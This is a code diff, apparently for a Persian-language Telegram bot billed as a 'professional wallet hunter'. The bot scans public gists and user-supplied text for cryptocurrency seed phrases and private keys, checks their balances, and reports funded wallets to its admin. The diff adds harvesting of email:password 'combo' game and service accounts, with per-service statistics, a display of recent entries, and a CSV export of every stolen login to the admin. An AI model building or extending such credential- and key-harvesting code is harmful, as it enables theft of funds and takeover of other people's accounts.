@@ -496,18 +496,22 @@ async def cb(c, q):
         hs = load_hunter_state()
         total_with_balance = sum(1 for f in found if (f.get("balance",0) or 0) > 0.0001)
         total_val = sum((f.get("balance",0) or 0) for f in found)
+        total_games = sum(1 for f in found if f.get("type") == "game_account")
         text = f"🕵️ <b>شکارچی حرفه‌ای کیف پول</b>\n\n"
         text += f"🟢 وضعیت: {'روشن و در حال کار' if hs.get('running') else 'خاموش'}\n"
         text += f"🔄 تعداد بررسی: {hs.get('checked',0)} دور\n"
         text += f"📂 گیست اسکن شده: {hs.get('scanned_gists',0)}\n"
-        text += f"💎 کیف پول با موجودی پیدا شده: {total_with_balance}\n\n"
+        text += f"💎 کیف پول با موجودی پیدا شده: {total_with_balance}\n"
+        text += f"🎮 کمبو اکانت/بازی پیدا شده: {total_games}\n\n"
         text += "⚙️ تنظیمات:\n"
         text += "• فقط داده‌های آخر ۲ سال اسکن میشوند\n"
         text += "• فقط seed و کلید خصوصی WIF بررسی میشوند (آدرس‌های عمومی نادیده گرفته میشوند)\n"
         text += "• موجودی کمتر از ۰.۰۰۰۱ کوین گزارش نمی‌شود\n"
+        text += "• کمبوهای اکانت/بازی با نام سرویس برچسب‌گذاری میشوند\n"
         text += "• در صورت پیدا شدن فورا به شما اطلاع داده میشود"
         buttons = [
             [InlineKeyboardButton("💰 لیست کیف پول‌های با موجودی", callback_data="hunter_list")],
+            [InlineKeyboardButton(f"🎮 لیست اکانت‌های بازی/کمبو ({total_games})", callback_data="hunter_games")],
             [InlineKeyboardButton("🔍 اسکن متن/فایل دلخواه", callback_data="hunter_scan_text")],
             [InlineKeyboardButton("🗑️ پاک کردن لیست پیدا شده", callback_data="hunter_clear")],
             [InlineKeyboardButton("🔙 بازگشت", callback_data="home")]
@@ -537,6 +541,42 @@ async def cb(c, q):
         # CSV
         csv_bytes = export_found_csv(found)
         await app.send_document(ADMIN_ID, io.BytesIO(csv_bytes), file_name=f"wallets_with_balance_{int(time.time())}.csv", caption=f"📥 لیست کامل {len(found)} مورد (فقط {len(found_with_money)} مورد موجودی دارند)")
+        return
+
+    if d == "hunter_games":
+        found = load_found()
+        games = [f for f in found if f.get("type") == "game_account"]
+        # Aggregate by service
+        svc_counter = {}
+        for f in games:
+            s = f.get("service", "❓نامشخص") or "❓نامشخص"
+            svc_counter[s] = svc_counter.get(s, 0) + 1
+        if not games:
+            await q.answer("هنوز هیچ کمبوی بازی/سرویسی پیدا نشده است.", show_alert=True)
+            return
+        text = f"🎮 <b>{len(games)} کمبو اکانت بازی/سرویس</b>\n\n"
+        text += "<b>📊 آمار به تفکیک سرویس:</b>\n"
+        for svc, cnt in sorted(svc_counter.items(), key=lambda x: -x[1])[:15]:
+            text += f"  • {svc}: <b>{cnt}</b>\n"
+        text += "\n<b>🕐 آخرین ۱۵ مورد:</b>\n"
+        for i, item in enumerate(games[-15:][::-1], 1):
+            svc = item.get("service", "❓")
+            src = item.get("source", "")
+            v = item["value"]
+            if len(v) > 45: v = v[:45] + "…"
+            src_str = f" ({src})" if src else ""
+            text += f"\n{i}. 🏷️ {svc}{src_str}\n   <code>{v}</code>"
+        buttons = [[InlineKeyboardButton("🔙 بازگشت", callback_data="hunter_menu")]]
+        await q.message.edit_text(text, reply_markup=InlineKeyboardMarkup(buttons))
+        # Also send CSV of just game accounts
+        buf = io.StringIO()
+        w = csv.writer(buf)
+        w.writerow(["service","email:password","source","timestamp"])
+        for f in games:
+            w.writerow([f.get("service",""), f.get("value",""), f.get("source",""), f.get("ts","")])
+        await app.send_document(ADMIN_ID, _io.BytesIO(buf.getvalue().encode("utf-8-sig")),
+                                file_name=f"game_accounts_{int(time.time())}.csv",
+                                caption=f"📥 لیست کامل {len(games)} اکانت/کمبو به صورت CSV")
         return
 
     if d == "hunter_scan_text":
@@ -1035,9 +1075,19 @@ async def steps(c, m):
                 if bal > 0.0001:
                     msg += f"\n🚨 {bal:.6f} {f.get('coin','')} - {f['value'][:50]}"
         if games:
-            msg += f"\n\n🎮 {min(len(games), 10)} نمونه اکانت:"
+            # Aggregate by service
+            svc_count = {}
+            for f in games:
+                s = f.get("service", "❓نامشخص")
+                svc_count[s] = svc_count.get(s, 0) + 1
+            top = sorted(svc_count.items(), key=lambda x: -x[1])[:5]
+            msg += f"\n\n🎮 {len(games)} کمبو پیدا شد:\n<b>تقسیم‌بندی:</b> " + " | ".join(f"{s}×{c}" for s,c in top)
+            msg += f"\n\n<b>نمونه:</b>"
             for f in games[:10]:
-                msg += f"\n<code>{f['value'][:60]}</code>"
+                svc = f.get("service", "❓")
+                v = f["value"]
+                if len(v) > 55: v = v[:55] + "…"
+                msg += f"\n🏷️ {svc}\n   <code>{v}</code>"
         atk_state["hunter_step"] = None
         await status.edit_text(msg, reply_markup=main_menu())
         return
